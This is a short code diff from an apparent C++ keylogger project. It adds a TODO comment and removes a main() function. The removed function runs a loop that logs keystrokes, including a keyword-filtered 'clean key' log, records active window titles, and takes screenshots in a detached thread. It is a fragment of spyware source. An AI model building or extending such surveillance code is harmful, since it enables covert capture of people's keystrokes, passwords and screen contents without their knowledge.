@@ -263,11 +263,11 @@ std::string Keylogger::create_file()
 	m_file_path = std::string(file_path);
 	
 	// Append keyword to a file name
+	// TODO: This should be as a utility function as this is used in many places
 	size_t position_to_prepend = m_file_path.find(".log");
 	std::string path_for_clean_keys = m_file_path;
 	path_for_clean_keys.insert(position_to_prepend, "_clean_key");
 	this->file_logs_clean_keys.open(path_for_clean_keys);
-
 
 	return m_file_path;
 }
@@ -294,36 +294,4 @@ std::vector<std::string> get_keywords()
 	}
 
 	return keywords;
-}
-
-int main(int argc, char *argv[])
-{
-	bool saving_enabled = true;
-
-	std::vector<std::string> keywords = get_keywords();
-
-	Keylogger keylogger(saving_enabled, keywords);
-	std::string file_path = keylogger.create_file();
-	std::ofstream file_logs(file_path);
-
-	Application_History application_history(file_logs, keylogger.get_file_logs_clean_keys(), 
-		file_path, saving_enabled);
-
-	// Take screenshots in a separate thread
-	Screenshot screenshoter;
-	std::thread screenshot_thread(&Screenshot::auto_start, screenshoter);
-	screenshot_thread.detach();
-
-	while (1)
-	{
-		Sleep(10); // give other programs time to run
-
-		application_history.get_window_name();
-		application_history.update_window();
-		keylogger.get_key(file_logs);
-	}
-
-	file_logs.close();
-
-	return 0;
 }
